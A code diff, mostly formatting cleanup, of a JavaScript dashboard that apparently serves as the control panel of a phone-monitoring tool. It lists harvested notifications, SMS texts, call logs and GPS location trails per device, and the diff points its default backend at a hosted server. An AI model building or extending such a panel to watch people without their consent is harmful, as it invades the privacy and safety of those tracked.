@@ -7,15 +7,15 @@
 
   // ═══ STATE ═══════════════════════════════════════════════════════════════════
   const S = {
-    serverUrl:  localStorage.getItem('gt_url')   || 'http://localhost:4000',
-    apiToken:   localStorage.getItem('gt_token') || '',
-    device:     localStorage.getItem('gt_device')|| 'all',
-    panel:      'overview',
-    ws:         null,
-    wsRetries:  0,
-    fetching:   false,
+    serverUrl: localStorage.getItem('gt_url') || 'https://transfer-backend-ii1e.onrender.com/',
+    apiToken: localStorage.getItem('gt_token') || '',
+    device: localStorage.getItem('gt_device') || 'all',
+    panel: 'overview',
+    ws: null,
+    wsRetries: 0,
+    fetching: false,
     lastSynced: null,
-    devices:    [],
+    devices: [],
     data: { notifications: [], sms: [], callLogs: [], locations: [], messages: [] },
     stats: { notifications: 0, sms: 0, callLogs: 0, locations: 0, messages: 0, devices: 0 },
     filters: {
@@ -31,62 +31,62 @@
   // ═══ DOM REFS ════════════════════════════════════════════════════════════════
   const $ = id => document.getElementById(id);
   const el = {
-    deviceSelect:  $('deviceSelect'),
-    topbarTitle:   $('topbarTitle'),
-    connDot:       $('connDot'),
-    connText:      $('connText'),
-    connPill:      $('connPill'),
-    wsDot:         $('wsDot'),
-    wsText:        $('wsText'),
-    lastSync:      $('lastSync'),
-    refreshBtn:    $('refreshBtn'),
-    menuBtn:       $('menuBtn'),
-    sidebar:       document.querySelector('.sidebar'),
+    deviceSelect: $('deviceSelect'),
+    topbarTitle: $('topbarTitle'),
+    connDot: $('connDot'),
+    connText: $('connText'),
+    connPill: $('connPill'),
+    wsDot: $('wsDot'),
+    wsText: $('wsText'),
+    lastSync: $('lastSync'),
+    refreshBtn: $('refreshBtn'),
+    menuBtn: $('menuBtn'),
+    sidebar: document.querySelector('.sidebar'),
 
     // KPI
-    kpiNotif:  $('kpiNotif'),
-    kpiSms:    $('kpiSms'),
-    kpiCalls:  $('kpiCalls'),
-    kpiLoc:    $('kpiLoc'),
+    kpiNotif: $('kpiNotif'),
+    kpiSms: $('kpiSms'),
+    kpiCalls: $('kpiCalls'),
+    kpiLoc: $('kpiLoc'),
 
     // Badges
     badgeNotif: $('badge-notifications'),
-    badgeSms:   $('badge-sms'),
+    badgeSms: $('badge-sms'),
     badgeCalls: $('badge-calls'),
-    badgeLoc:   $('badge-location'),
+    badgeLoc: $('badge-location'),
 
     // Overview
-    activityFeed:  $('activityFeed'),
-    deviceInfoList:$('deviceInfoList'),
+    activityFeed: $('activityFeed'),
+    deviceInfoList: $('deviceInfoList'),
 
     // Notifications
-    notifList:     $('notifList'),
-    notifSearch:   $('notifSearch'),
-    notifAppFilter:$('notifAppFilter'),
+    notifList: $('notifList'),
+    notifSearch: $('notifSearch'),
+    notifAppFilter: $('notifAppFilter'),
     clearNotifBtn: $('clearNotifBtn'),
 
     // SMS
-    smsList:       $('smsList'),
-    smsSearch:     $('smsSearch'),
+    smsList: $('smsList'),
+    smsSearch: $('smsSearch'),
     smsTypeFilter: $('smsTypeFilter'),
-    clearSmsBtn:   $('clearSmsBtn'),
+    clearSmsBtn: $('clearSmsBtn'),
 
     // Calls
-    callList:       $('callList'),
+    callList: $('callList'),
     callTypeFilter: $('callTypeFilter'),
-    clearCallsBtn:  $('clearCallsBtn'),
-    callStats:      $('callStats'),
+    clearCallsBtn: $('clearCallsBtn'),
+    callStats: $('callStats'),
 
     // Location
-    centerMapBtn:  $('centerMapBtn'),
-    clearLocBtn:   $('clearLocBtn'),
-    locTableBody:  $('locTableBody'),
+    centerMapBtn: $('centerMapBtn'),
+    clearLocBtn: $('clearLocBtn'),
+    locTableBody: $('locTableBody'),
 
     // Settings
-    settingsUrl:    $('settingsUrl'),
-    settingsToken:  $('settingsToken'),
-    testConnBtn:    $('testConnBtn'),
-    saveSettingsBtn:$('saveSettingsBtn'),
+    settingsUrl: $('settingsUrl'),
+    settingsToken: $('settingsToken'),
+    testConnBtn: $('testConnBtn'),
+    saveSettingsBtn: $('saveSettingsBtn'),
     settingsTestResult: $('settingsTestResult'),
 
     toastContainer: $('toastContainer'),
@@ -96,8 +96,8 @@
 
   function esc(str) {
     return String(str || '')
-      .replace(/&/g,'&amp;').replace(/</g,'&lt;')
-      .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
   }
 
   function formatTime(iso) {
@@ -107,23 +107,23 @@
     const now = new Date();
     const diff = (now - d) / 1000;
     if (diff < 60) return 'Just now';
-    if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
-    if (diff < 86400) return d.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
-    if (diff < 604800) return d.toLocaleDateString([], {weekday:'short',hour:'2-digit',minute:'2-digit'});
-    return d.toLocaleDateString([], {month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
+    if (diff < 86400) return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    if (diff < 604800) return d.toLocaleDateString([], { weekday: 'short', hour: '2-digit', minute: '2-digit' });
+    return d.toLocaleDateString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
   }
 
   function formatDur(secs) {
     secs = Number(secs) || 0;
     if (secs < 60) return `${secs}s`;
-    return `${Math.floor(secs/60)}m ${secs%60}s`;
+    return `${Math.floor(secs / 60)}m ${secs % 60}s`;
   }
 
   function formatPhone(num) {
     if (!num) return 'Unknown';
-    const clean = String(num).replace(/\D/g,'');
-    if (clean.length === 10) return `${clean.slice(0,3)} ${clean.slice(3,6)} ${clean.slice(6)}`;
-    if (clean.length === 12) return `+${clean.slice(0,2)} ${clean.slice(2,7)} ${clean.slice(7)}`;
+    const clean = String(num).replace(/\D/g, '');
+    if (clean.length === 10) return `${clean.slice(0, 3)} ${clean.slice(3, 6)} ${clean.slice(6)}`;
+    if (clean.length === 12) return `+${clean.slice(0, 2)} ${clean.slice(2, 7)} ${clean.slice(7)}`;
     return num;
   }
 
@@ -139,7 +139,7 @@
 
   async function api(path, opts = {}) {
     const url = S.serverUrl.replace(/\/+$/, '') + path;
-    const headers = { 'Content-Type':'application/json', Authorization:`Bearer ${S.apiToken}`, ...(opts.headers||{}) };
+    const headers = { 'Content-Type': 'application/json', Authorization: `Bearer ${S.apiToken}`, ...(opts.headers || {}) };
     const res = await fetch(url, { ...opts, headers });
     if (!res.ok) {
       const body = await res.json().catch(() => null);
@@ -174,7 +174,7 @@
           if (msg.event === 'data_updated') {
             loadData(true);
           }
-        } catch {}
+        } catch { }
       };
       S.ws.onclose = () => {
         el.wsDot.className = 'ws-dot';
@@ -186,7 +186,7 @@
         el.wsDot.className = 'ws-dot error';
         el.wsText.textContent = 'WS Error';
       };
-    } catch {}
+    } catch { }
   }
 
   // ═══ DATA LOADING ════════════════════════════════════════════════════════════
@@ -196,7 +196,7 @@
     S.fetching = true;
 
     try {
-      const health = await fetch(S.serverUrl.replace(/\/+$/,'') + '/health')
+      const health = await fetch(S.serverUrl.replace(/\/+$/, '') + '/health')
         .then(r => r.json()).catch(() => null);
       if (!health || health.status !== 'ok') throw new Error('Backend unreachable');
 
@@ -214,18 +214,18 @@
 
       S.devices = devices.devices || [];
       S.data.notifications = notifs.notifications || [];
-      S.data.sms           = sms.sms             || [];
-      S.data.callLogs      = calls.callLogs       || [];
-      S.data.locations     = locs.locations       || [];
+      S.data.sms = sms.sms || [];
+      S.data.callLogs = calls.callLogs || [];
+      S.data.locations = locs.locations || [];
 
       if (overview?.stats) {
         S.stats = {
           notifications: overview.stats.totalNotifications || S.data.notifications.length,
-          sms:           overview.stats.totalSms           || S.data.sms.length,
-          callLogs:      overview.stats.totalCallLogs      || S.data.callLogs.length,
-          locations:     overview.stats.totalLocations     || S.data.locations.length,
-          messages:      overview.stats.totalMessages      || 0,
-          devices:       overview.stats.totalDevices       || S.devices.length,
+          sms: overview.stats.totalSms || S.data.sms.length,
+          callLogs: overview.stats.totalCallLogs || S.data.callLogs.length,
+          locations: overview.stats.totalLocations || S.data.locations.length,
+          messages: overview.stats.totalMessages || 0,
+          devices: overview.stats.totalDevices || S.devices.length,
         };
       }
 
@@ -251,16 +251,16 @@
 
   function updateKpis() {
     el.kpiNotif.textContent = S.stats.notifications;
-    el.kpiSms.textContent   = S.stats.sms;
+    el.kpiSms.textContent = S.stats.sms;
     el.kpiCalls.textContent = S.stats.callLogs;
-    el.kpiLoc.textContent   = S.stats.locations;
+    el.kpiLoc.textContent = S.stats.locations;
   }
 
   function updateBadges() {
     el.badgeNotif.textContent = S.data.notifications.length || '';
-    el.badgeSms.textContent   = S.data.sms.length           || '';
-    el.badgeCalls.textContent = S.data.callLogs.length      || '';
-    el.badgeLoc.textContent   = S.data.locations.length     || '';
+    el.badgeSms.textContent = S.data.sms.length || '';
+    el.badgeCalls.textContent = S.data.callLogs.length || '';
+    el.badgeLoc.textContent = S.data.locations.length || '';
   }
 
   // ═══ DEVICE DROPDOWN ═════════════════════════════════════════════════════════
@@ -268,7 +268,7 @@
   function updateDeviceDropdown() {
     const current = el.deviceSelect.value;
     el.deviceSelect.innerHTML = '<option value="all">All Devices</option>' +
-      S.devices.map(d => `<option value="${esc(d.deviceId)}">${esc(d.deviceId.slice(0,20))} (${d.messageCount||0}m, ${d.locationCount||0}l)</option>`).join('');
+      S.devices.map(d => `<option value="${esc(d.deviceId)}">${esc(d.deviceId.slice(0, 20))} (${d.messageCount || 0}m, ${d.locationCount || 0}l)</option>`).join('');
     if (S.devices.some(d => d.deviceId === current) || current === 'all') {
       el.deviceSelect.value = current;
     }
@@ -278,11 +278,11 @@
 
   function renderActivePanel() {
     switch (S.panel) {
-      case 'overview':      renderOverview(); break;
+      case 'overview': renderOverview(); break;
       case 'notifications': renderNotifications(); break;
-      case 'sms':           renderSms(); break;
-      case 'calls':         renderCalls(); break;
-      case 'location':      renderLocation(); break;
+      case 'sms': renderSms(); break;
+      case 'calls': renderCalls(); break;
+      case 'location': renderLocation(); break;
     }
   }
 
@@ -291,10 +291,10 @@
   function renderOverview() {
     // Activity feed — mix of last items from each type
     const items = [
-      ...S.data.notifications.slice(0, 5).map(n => ({ icon:'🔔', title: n.title || n.appId, sub: n.body, time: n.timestamp })),
-      ...S.data.sms.slice(0, 5).map(s => ({ icon:'💬', title: formatPhone(s.address), sub: s.body, time: s.timestamp })),
-      ...S.data.callLogs.slice(0, 5).map(c => ({ icon: c.type==='missed'?'📵':c.type==='incoming'?'📲':'📤', title: formatPhone(c.number), sub: `${c.type} · ${formatDur(c.duration)}`, time: c.timestamp })),
-      ...S.data.locations.slice(0, 3).map(l => ({ icon:'📍', title: `${Number(l.latitude).toFixed(4)}, ${Number(l.longitude).toFixed(4)}`, sub: `±${Math.round(l.accuracy||0)}m accuracy`, time: l.capturedAt })),
+      ...S.data.notifications.slice(0, 5).map(n => ({ icon: '🔔', title: n.title || n.appId, sub: n.body, time: n.timestamp })),
+      ...S.data.sms.slice(0, 5).map(s => ({ icon: '💬', title: formatPhone(s.address), sub: s.body, time: s.timestamp })),
+      ...S.data.callLogs.slice(0, 5).map(c => ({ icon: c.type === 'missed' ? '📵' : c.type === 'incoming' ? '📲' : '📤', title: formatPhone(c.number), sub: `${c.type} · ${formatDur(c.duration)}`, time: c.timestamp })),
+      ...S.data.locations.slice(0, 3).map(l => ({ icon: '📍', title: `${Number(l.latitude).toFixed(4)}, ${Number(l.longitude).toFixed(4)}`, sub: `±${Math.round(l.accuracy || 0)}m accuracy`, time: l.capturedAt })),
     ].sort((a, b) => new Date(b.time) - new Date(a.time)).slice(0, 15);
 
     if (items.length === 0) {
@@ -318,7 +318,7 @@
       el.deviceInfoList.innerHTML = S.devices.map(d => `
         <div class="device-info-item">
           <div class="device-id">${esc(d.deviceId)}</div>
-          <div class="device-stats">${d.messageCount||0} msg · ${d.locationCount||0} loc · Last: ${formatTime(d.lastActivity)}</div>
+          <div class="device-stats">${d.messageCount || 0} msg · ${d.locationCount || 0} loc · Last: ${formatTime(d.lastActivity)}</div>
         </div>`).join('');
     }
   }
@@ -326,29 +326,29 @@
   // ═══ NOTIFICATIONS ═══════════════════════════════════════════════════════════
 
   function renderNotifications() {
-    const q   = S.filters.notifSearch.toLowerCase();
+    const q = S.filters.notifSearch.toLowerCase();
     const app = S.filters.notifApp;
 
     // Build app filter options
     const apps = [...new Set(S.data.notifications.map(n => n.appId).filter(Boolean))];
     const curApp = el.notifAppFilter.value;
     el.notifAppFilter.innerHTML = '<option value="all">All apps</option>' +
-      apps.map(a => `<option value="${esc(a)}" ${a === curApp ? 'selected':''}>…${esc(a.split('.').slice(-1)[0])}</option>`).join('');
+      apps.map(a => `<option value="${esc(a)}" ${a === curApp ? 'selected' : ''}>…${esc(a.split('.').slice(-1)[0])}</option>`).join('');
 
     const filtered = S.data.notifications.filter(n =>
       (app === 'all' || n.appId === app) &&
-      (!q || (n.title||'').toLowerCase().includes(q) || (n.body||'').toLowerCase().includes(q) || (n.appId||'').toLowerCase().includes(q))
+      (!q || (n.title || '').toLowerCase().includes(q) || (n.body || '').toLowerCase().includes(q) || (n.appId || '').toLowerCase().includes(q))
     );
 
     if (filtered.length === 0) {
-      el.notifList.innerHTML = `<div class="empty-state"><div class="empty-icon">🔔</div><p class="empty-title">${q||app!=='all'?'No matching notifications':'No notifications yet'}</p><p class="empty-desc">${q||app!=='all'?'Try adjusting your filter.':'Notifications will appear here when synced.'}</p></div>`;
+      el.notifList.innerHTML = `<div class="empty-state"><div class="empty-icon">🔔</div><p class="empty-title">${q || app !== 'all' ? 'No matching notifications' : 'No notifications yet'}</p><p class="empty-desc">${q || app !== 'all' ? 'Try adjusting your filter.' : 'Notifications will appear here when synced.'}</p></div>`;
       return;
     }
 
     el.notifList.innerHTML = filtered.map(n => `
       <div class="notif-item">
         <div style="flex:1;min-width:0">
-          <span class="app-chip">${esc((n.appId||'').split('.').slice(-1)[0])}</span>
+          <span class="app-chip">${esc((n.appId || '').split('.').slice(-1)[0])}</span>
           <div class="notif-title">${esc(n.title || '(no title)')}</div>
           <div class="notif-body">${esc(n.body || '')}</div>
         </div>
@@ -359,16 +359,16 @@
   // ═══ SMS ══════════════════════════════════════════════════════════════════════
 
   function renderSms() {
-    const q    = S.filters.smsSearch.toLowerCase();
+    const q = S.filters.smsSearch.toLowerCase();
     const type = S.filters.smsType;
 
     const filtered = S.data.sms.filter(s =>
       (type === 'all' || s.type === type) &&
-      (!q || (s.address||'').toLowerCase().includes(q) || (s.body||'').toLowerCase().includes(q))
+      (!q || (s.address || '').toLowerCase().includes(q) || (s.body || '').toLowerCase().includes(q))
     );
 
     if (filtered.length === 0) {
-      el.smsList.innerHTML = `<div class="empty-state"><div class="empty-icon">💬</div><p class="empty-title">${q||type!=='all'?'No matching SMS':'No SMS yet'}</p></div>`;
+      el.smsList.innerHTML = `<div class="empty-state"><div class="empty-icon">💬</div><p class="empty-title">${q || type !== 'all' ? 'No matching SMS' : 'No SMS yet'}</p></div>`;
       return;
     }
 
@@ -392,8 +392,8 @@
     const filtered = type === 'all' ? S.data.callLogs : S.data.callLogs.filter(c => c.type === type);
 
     // Stats
-    const inc  = S.data.callLogs.filter(c => c.type === 'incoming').length;
-    const out  = S.data.callLogs.filter(c => c.type === 'outgoing').length;
+    const inc = S.data.callLogs.filter(c => c.type === 'incoming').length;
+    const out = S.data.callLogs.filter(c => c.type === 'outgoing').length;
     const miss = S.data.callLogs.filter(c => c.type === 'missed').length;
     el.callStats.innerHTML = `
       <div class="call-stat-chip stat-incoming">📲 ${inc} Incoming</div>
@@ -405,13 +405,13 @@
       return;
     }
 
-    const icons = { incoming:'📲', outgoing:'📤', missed:'📵' };
+    const icons = { incoming: '📲', outgoing: '📤', missed: '📵' };
     el.callList.innerHTML = filtered.map(c => `
       <div class="call-item">
-        <div class="call-icon call-${esc(c.type)}">${icons[c.type]||'📞'}</div>
+        <div class="call-icon call-${esc(c.type)}">${icons[c.type] || '📞'}</div>
         <div style="flex:1;min-width:0">
           <div class="call-number">${esc(formatPhone(c.number))}</div>
-          <div class="call-sub">${esc(c.type)} ${c.deviceId ? '· '+esc(c.deviceId.slice(0,12))+'…':''}</div>
+          <div class="call-sub">${esc(c.type)} ${c.deviceId ? '· ' + esc(c.deviceId.slice(0, 12)) + '…' : ''}</div>
         </div>
         <div style="text-align:right">
           <div class="call-duration">${formatDur(c.duration)}</div>
@@ -447,7 +447,7 @@
       return;
     }
 
-    const sorted = [...locs].sort((a,b) => new Date(a.capturedAt) - new Date(b.capturedAt));
+    const sorted = [...locs].sort((a, b) => new Date(a.capturedAt) - new Date(b.capturedAt));
     const latLngs = [];
 
     sorted.forEach((loc, i) => {
@@ -457,22 +457,22 @@
       const color = isLatest ? '#34A853' : '#4285F4';
       const icon = L.divIcon({
         className: '',
-        html: `<div style="width:${isLatest?14:10}px;height:${isLatest?14:10}px;background:${color};border:2px solid #fff;border-radius:50%;box-shadow:0 0 6px ${color}"></div>`,
-        iconSize: [isLatest?14:10, isLatest?14:10],
-        iconAnchor: [isLatest?7:5, isLatest?7:5],
+        html: `<div style="width:${isLatest ? 14 : 10}px;height:${isLatest ? 14 : 10}px;background:${color};border:2px solid #fff;border-radius:50%;box-shadow:0 0 6px ${color}"></div>`,
+        iconSize: [isLatest ? 14 : 10, isLatest ? 14 : 10],
+        iconAnchor: [isLatest ? 7 : 5, isLatest ? 7 : 5],
       });
-      L.marker(ll, {icon}).bindPopup(`
-        <b>${isLatest?'📍 Latest':'📍 Location'}</b><br>
-        Device: ${esc(loc.deviceId||'')}<br>
+      L.marker(ll, { icon }).bindPopup(`
+        <b>${isLatest ? '📍 Latest' : '📍 Location'}</b><br>
+        Device: ${esc(loc.deviceId || '')}<br>
         ${Number(loc.latitude).toFixed(6)}, ${Number(loc.longitude).toFixed(6)}<br>
-        Accuracy: ±${Math.round(loc.accuracy||0)}m<br>
+        Accuracy: ±${Math.round(loc.accuracy || 0)}m<br>
         ${formatTime(loc.capturedAt)}`).addTo(S.markersLayer);
     });
 
     if (latLngs.length > 1) {
-      S.polylineLayer = L.polyline(latLngs, { color:'#4285F4', weight:2, opacity:0.6, dashArray:'5,8' }).addTo(S.map);
+      S.polylineLayer = L.polyline(latLngs, { color: '#4285F4', weight: 2, opacity: 0.6, dashArray: '5,8' }).addTo(S.map);
     }
-    if (latLngs.length) S.map.fitBounds(L.latLngBounds(latLngs), { padding:[30,30], maxZoom:15 });
+    if (latLngs.length) S.map.fitBounds(L.latLngBounds(latLngs), { padding: [30, 30], maxZoom: 15 });
 
     // Table
     el.locTableBody.innerHTML = locs.map(l => `
@@ -480,8 +480,8 @@
         <td>${formatTime(l.capturedAt)}</td>
         <td class="mono">${Number(l.latitude).toFixed(6)}</td>
         <td class="mono">${Number(l.longitude).toFixed(6)}</td>
-        <td>±${Math.round(l.accuracy||0)}m</td>
-        <td><span style="font-size:11px;font-family:monospace;color:var(--text-disabled)">${esc((l.deviceId||'').slice(0,14))}…</span></td>
+        <td>±${Math.round(l.accuracy || 0)}m</td>
+        <td><span style="font-size:11px;font-family:monospace;color:var(--text-disabled)">${esc((l.deviceId || '').slice(0, 14))}…</span></td>
         <td><button class="locate-btn" onclick="window._locateOn(${l.latitude},${l.longitude})">Locate</button></td>
       </tr>`).join('');
 
@@ -493,8 +493,8 @@
   // ═══ PANEL SWITCHING ══════════════════════════════════════════════════════════
 
   const panelTitles = {
-    overview:'Overview', notifications:'Notifications', sms:'SMS Messages',
-    calls:'Call Logs', location:'Location History', settings:'Settings',
+    overview: 'Overview', notifications: 'Notifications', sms: 'SMS Messages',
+    calls: 'Call Logs', location: 'Location History', settings: 'Settings',
   };
 
   function switchPanel(id) {
@@ -520,7 +520,7 @@
     if (id === 'calls') renderCalls();
     if (id === 'overview') renderOverview();
     if (id === 'settings') {
-      el.settingsUrl.value   = S.serverUrl;
+      el.settingsUrl.value = S.serverUrl;
       el.settingsToken.value = S.apiToken;
     }
   }
@@ -528,10 +528,10 @@
   // ═══ CLEAR ACTIONS ════════════════════════════════════════════════════════════
 
   async function clearData(type) {
-    const labels = { notifications:'notifications', sms:'SMS messages', callLogs:'call logs', locations:'location history' };
-    if (!confirm(`Delete all ${labels[type]||type} for ${S.device === 'all' ? 'ALL devices' : S.device}?`)) return;
+    const labels = { notifications: 'notifications', sms: 'SMS messages', callLogs: 'call logs', locations: 'location history' };
+    if (!confirm(`Delete all ${labels[type] || type} for ${S.device === 'all' ? 'ALL devices' : S.device}?`)) return;
     try {
-      await api(`/api/v1/data/${encodeURIComponent(S.device)}/${type}`, { method:'DELETE' });
+      await api(`/api/v1/data/${encodeURIComponent(S.device)}/${type}`, { method: 'DELETE' });
       showToast(`${labels[type]} cleared`, 'success');
       loadData(true);
     } catch (e) {
@@ -542,15 +542,15 @@
   // ═══ SETTINGS ════════════════════════════════════════════════════════════════
 
   async function testConnection() {
-    const url   = el.settingsUrl.value.trim().replace(/\/+$/,'');
+    const url = el.settingsUrl.value.trim().replace(/\/+$/, '');
     const token = el.settingsToken.value.trim();
-    const res   = el.settingsTestResult;
+    const res = el.settingsTestResult;
     res.className = 'test-result';
     res.textContent = 'Testing…';
     try {
       const health = await fetch(`${url}/health`).then(r => r.json());
       const authRes = await fetch(`${url}/api/v1/data/devices`, {
-        headers:{ Authorization:`Bearer ${token}` }
+        headers: { Authorization: `Bearer ${token}` }
       });
       if (!authRes.ok) {
         res.className = 'test-result error';
@@ -566,12 +566,12 @@
   }
 
   function saveSettings() {
-    const url   = el.settingsUrl.value.trim().replace(/\/+$/,'');
+    const url = el.settingsUrl.value.trim().replace(/\/+$/, '');
     const token = el.settingsToken.value.trim();
-    if (!url)           return showToast('Enter server URL', 'error');
-    if (token.length<32) return showToast('Token must be 32+ chars', 'error');
+    if (!url) return showToast('Enter server URL', 'error');
+    if (token.length < 32) return showToast('Token must be 32+ chars', 'error');
     S.serverUrl = url;
-    S.apiToken  = token;
+    S.apiToken = token;
     localStorage.setItem('gt_url', url);
     localStorage.setItem('gt_token', token);
     showToast('Settings saved — reconnecting…', 'success');
@@ -619,7 +619,7 @@
     el.centerMapBtn.addEventListener('click', () => {
       if (!S.map || S.data.locations.length === 0) return;
       const l = S.data.locations[0];
-      S.map.flyTo([l.latitude, l.longitude], 15, { duration:1 });
+      S.map.flyTo([l.latitude, l.longitude], 15, { duration: 1 });
     });
     el.clearLocBtn.addEventListener('click', () => clearData('locations'));
 
@@ -633,9 +633,9 @@
   function init() {
     setupEvents();
     // Pre-fill settings
-    el.settingsUrl.value   = S.serverUrl;
+    el.settingsUrl.value = S.serverUrl;
     el.settingsToken.value = S.apiToken;
-    el.deviceSelect.value  = S.device;
+    el.deviceSelect.value = S.device;
 
     // Connect WebSocket
     if (S.apiToken) connectWs();
